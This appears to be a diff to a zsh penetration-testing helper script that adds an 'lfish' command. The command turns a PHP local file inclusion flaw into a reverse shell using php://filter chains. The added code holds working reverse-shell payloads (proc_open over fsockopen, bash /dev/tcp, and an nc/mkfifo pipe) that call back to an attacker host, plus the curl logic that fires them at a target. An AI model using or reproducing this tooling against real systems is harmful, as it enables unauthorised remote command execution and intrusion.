@@ -119,6 +119,60 @@ _revshell-lhost() {
   return 1
 }
 
+_lfish-generator() {
+  local root="${ZSH_HELPER_DIR:A:h:h:h}"
+  echo "$root/workspace/third-party/php_filter_chain_generator/php_filter_chain_generator.py"
+}
+
+_lfish-types() {
+  echo "proc bash nc"
+}
+
+_lfish-payload() {
+  local type="$1" lhost="$2" lport="$3"
+
+  case "$type" in
+    proc)
+      cat <<EOF
+<?php \$s=fsockopen("${lhost}",${lport});\$p=proc_open("/bin/sh -i",array(0=>\$s,1=>\$s,2=>\$s),\$pipes); ?>
+EOF
+      ;;
+    bash)
+      cat <<EOF
+<?php system("bash -c 'bash -i >& /dev/tcp/${lhost}/${lport} 0>&1'"); ?>
+EOF
+      ;;
+    nc)
+      cat <<EOF
+<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc ${lhost} ${lport} >/tmp/f"); ?>
+EOF
+      ;;
+    *)
+      echo "[-] lfish: unknown shell type: $type" >&2
+      return 1
+      ;;
+  esac
+}
+
+_lfish-build-filter() {
+  local shell_type="$1" lhost="$2" lport="$3"
+  local generator payload chain
+
+  generator="$(_lfish-generator)"
+  [[ -f "$generator" ]] || {
+    echo "[-] lfish: generator not found: $generator" >&2
+    return 1
+  }
+
+  payload="$(_lfish-payload "$shell_type" "$lhost" "$lport")" || return 1
+  chain="$(python3 "$generator" --chain "$payload" | sed -n '2p')"
+  [[ -n "$chain" ]] || {
+    echo "[-] lfish: failed to generate php filter chain" >&2
+    return 1
+  }
+  print -r -- "$chain"
+}
+
 # Attacker IPv4 only (stdout) — tun0, else eth0
 lhost() {
   if [[ $# -ge 1 && ( "$1" == -h || "$1" == --help ) ]]; then
@@ -254,6 +308,139 @@ webrsh() {
   _webrsh-trigger "$target" "$listen_port" "$param" "$method" "$auth_spec"
 }
 
+lfish() {
+  local param=""
+  local method="GET"
+  local shell_type="proc"
+  local target_spec="" target="" listen_port="4444" lhost="" auth_spec=""
+  local chain enc
+
+  (( $+functions[target-load] )) && [[ -z "${IP:-}" ]] && target-load 2>/dev/null
+
+  while [[ $# -gt 0 ]]; do
+    case "$1" in
+      -h|--help)
+        echo "usage: lfish [options] [path|url]"
+        echo "LFI/php://filter include -> reverse shell"
+        echo "  path/url uses \$IP when omitted:"
+        echo "    /secret-script.php  secret-script.php  :8080/include.php  http://host/secret-script.php"
+        echo ""
+        echo "options:"
+        echo "  -p, --param NAME        vulnerable include/filter parameter name"
+        echo "  -X, --method METHOD     GET (default) or POST"
+        echo "  --post                  shortcut for -X POST"
+        echo "  -t, --type TYPE         shell type: proc (default), bash, nc"
+        echo "  -l, --lhost IP          attacker IP (default: lhost)"
+        echo "  -P, --lport N           reverse shell port (default: 4444)"
+        echo "  -u, --user USER[:PASS]  HTTP Basic Auth (PASS from creds-list if omitted)"
+        echo ""
+        echo "examples:"
+        echo "  lfish http://\$IP/secret-script.php -p file"
+        echo "  lfish /secret-script.php -p page"
+        echo "  lfish /secret-script.php -p file -t bash"
+        echo "  lfish :8080/include.php -p language -X POST -P 5555"
+        echo "  lfish /secret-script.php -p file -u admin:admin"
+        return 0
+        ;;
+      -u|--user)
+        auth_spec="$2"
+        shift 2
+        ;;
+      -X|--method|--request)
+        method="${(U)2}"
+        shift 2
+        ;;
+      --post)
+        method=POST
+        shift
+        ;;
+      -p|--param)
+        param="$2"
+        shift 2
+        ;;
+      -t|--type)
+        shell_type="$2"
+        shift 2
+        ;;
+      -l|--lhost)
+        lhost="$2"
+        shift 2
+        ;;
+      -P|--lport|--listen-port|--port)
+        listen_port="$2"
+        shift 2
+        ;;
+      *)
+        if _webrsh-is-target "$1"; then
+          if [[ -n "$target_spec" ]]; then
+            echo "[-] lfish: multiple targets: ${target_spec} and $1" >&2
+            return 1
+          fi
+          target_spec="$1"
+        else
+          echo "usage: lfish [options] [path|url]" >&2
+          return 1
+        fi
+        shift
+        ;;
+    esac
+  done
+
+  [[ -n "$param" ]] || {
+    echo "[-] lfish: --param is required" >&2
+    echo "usage: lfish [options] [path|url]" >&2
+    return 1
+  }
+
+  [[ -n "$target_spec" ]] || {
+    echo "usage: lfish [options] [path|url]" >&2
+    return 1
+  }
+
+  target="$(_webrsh-resolve-url "$target_spec")" || return 1
+
+  if [[ -z "$lhost" ]]; then
+    lhost="$(_revshell-lhost)" || {
+      echo "[-] lfish: LHOST not found (tun0/eth0)" >&2
+      return 1
+    }
+  fi
+
+  _webrsh-resolve-auth "$auth_spec" "$target" || return 1
+
+  case " $(_lfish-types) " in
+    *" ${shell_type} "*) ;;
+    *)
+      echo "[-] lfish: unknown shell type: $shell_type" >&2
+      echo "[*] available types: $(_lfish-types)" >&2
+      return 1
+      ;;
+  esac
+
+  chain="$(_lfish-build-filter "$shell_type" "$lhost" "$listen_port")" || return 1
+  enc="$(python3 -c 'import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=""))' "$chain")"
+
+  echo "[*] LHOST=$lhost port=$listen_port method=${method} param=${param} type=${shell_type}" >&2
+  echo "[*] filter chain generated" >&2
+  echo "[*] start listener: listen $listen_port" >&2
+
+  case "$method" in
+    GET)
+      echo "[*] GET ${target}?${param}=..." >&2
+      curl -sS "${_WEBRSH_CURL_AUTH[@]}" "${target}?${param}=${enc}"
+      ;;
+    POST)
+      echo "[*] POST ${target} (${param}=...)" >&2
+      curl -sS "${_WEBRSH_CURL_AUTH[@]}" -X POST --data-urlencode "${param}=${chain}" "$target"
+      ;;
+    *)
+      echo "[-] lfish: unknown method: $method (use GET or POST)" >&2
+      return 1
+      ;;
+  esac
+  echo ""
+}
+
 _webrsh() {
   _arguments \
     '-X[HTTP method]:method:(GET POST)' \
@@ -266,3 +453,18 @@ _webrsh() {
 }
 
 compdef _webrsh webrsh
+
+_lfish() {
+  _arguments \
+    '-p[vulnerable include/filter parameter name]:param name:' \
+    '-X[HTTP method]:method:(GET POST)' \
+    '--post[use POST]' \
+    '-t[shell type]:type:(proc bash nc)' \
+    '-l[attacker IP]:ip:_hosts' \
+    '-P[reverse shell port]:port:(4444 5555 6666)' \
+    '-u[HTTP Basic user or user:pass]:user:' \
+    '1:path or url:(/secret-script.php secret-script.php :8080/include.php)' \
+    '*:path or url:(/secret-script.php secret-script.php :8080/include.php)'
+}
+
+compdef _lfish lfish
